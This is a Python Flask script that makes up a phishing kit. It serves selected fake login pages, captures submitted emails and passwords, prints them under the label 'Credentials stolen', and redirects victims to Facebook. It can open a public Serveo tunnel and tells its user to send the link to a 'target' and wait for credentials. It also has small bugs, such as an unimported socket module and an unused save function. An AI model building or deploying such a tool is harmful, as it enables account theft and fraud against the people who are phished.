#!/usr/bin/env python3
import sys
import os, subprocess

# Add the parent directory to sys.path
current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
sys.path.append(parent_dir)

import subprocess
import json
import logging
from flask import Flask, render_template, request, redirect
from color_functions import type_text, display_template
from color_functions import cyan as cyan, magenta as magenta, reset as reset, yellow as yellow, green as green, light_blue as light_blue

def clear_screen():
    with open('doom.txt', 'r') as doom_file:
      doom_content = doom_file.read()
      cls= subprocess.run(['clear'])
      print(f"{green}{doom_content}{reset}")
      if not doom_content:
        return
    if not cls:
      subprocess.run(['cls'])
    return

# Read templates from JSON manifest
with open('manifest.json', 'r') as manifest_file:
    manifest = json.load(manifest_file)
    templates = manifest.get('templates', [])

app = Flask(__name__, template_folder='./', static_url_path='/static')

@app.route('/')
def home():
    ip = '[...]'
    print(f"\n{light_blue}    ✔️Target captured...{reset}")
    print(f"{cyan} IP: {ip}{reset}")
    return render_template(f'{page}.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('user')
    password = request.form.get('pwd')
    if email and password:
        print("{} Credentials stolen{}".format(light_blue, reset))
        print(f"  {yellow}[{green}~{yellow}] {magenta}Email   {cyan}:{green}{email}{reset}")
        print(f"  {yellow}[{green}~{yellow}] {magenta}Password{cyan}:{green}{password}{reset}")

        print()
        return redirect('https://fb.com/01')
    return redirect('https://www.facebook.com/recover')

def get_local_ip():
    try:
        # Create a socket and connect to a remote server
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except socket.error:
        return '127.0.0.1'  # Return localhost IP if unable to retrieve

def print_ips():
    # Get the local IP address
    local_ip = get_local_ip()
    print(" [testing] Localhost:", local_ip)

    # Get the public IP address
    public_ip = socket.gethostbyname(socket.getfqdn())
    public_link = f"http://{public_ip}"
    print(" [distribution] Public Link:", public_link)

    # Get the server IP address
    server_ip = get_local_ip()
    server_link = f"http://{server_ip}:8080"
    print(" [Server] Server Link:", server_link)

    print(" Development server started...\n")
    print(" Waiting for targets...\n")

def save_credentials(email, password):
    with open('../credentials.txt', 'a') as file:
        file.write(f'Email: {email}\n')
        file.write(f'Password: {password}\n')
        file.write(f'Phishing Page Number: {page}\n')
        file.write('---------------------\n')

if __name__ == '__main__':
    app.logger.disabled = True
    alog = logging.getLogger('werkzeug')
    alog.setLevel(logging.ERROR)
    alog.disabled = True
    
    print(f"{light_blue}Select an option")
    page = input(f"{magenta} >>> {cyan}")
    print()
    
    clear_screen()
    print(f"{yellow}Localhost link is appears only on your device{reset}")
    print(f"{reset}")
    print(f"{yellow}Serveo provides a temporary public link -  that appears on the internet{reset}")
    print()
    print(f"{yellow}[{reset}01{yellow}] {reset}Localhost 🏠")
    print()
    print(f"{yellow}[{reset}02{yellow}] {reset}Serveo 🛜")
    print()
    print(f"{light_blue}Select an option")
    print()
    public_url = input(f"{magenta}>>> {cyan}")
    
    clear_screen()

    if public_url == "02":
        print(f"{reset}{green}Starting Serveo Tunnel ...{reset}")
        print(f"{light_blue}Generating public link...")
        from expose import Serveo_Link
        serveo_url = Serveo_Link()
        clear_screen()
        print(f"👉{light_blue}URL:{green} https://{serveo_url}{reset}")
        print()
        print(f"{yellow} Copy the link and send URL with to target and wait for credentials {reset}")
        print()
        print(f"{light_blue}Waiting for credents (phone, passwords etc.) :{reset}")
    else:
        print(f"{green}Link is 127.0.0.1:4511")

    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    app.run(host='0.0.0.0', port=4511)
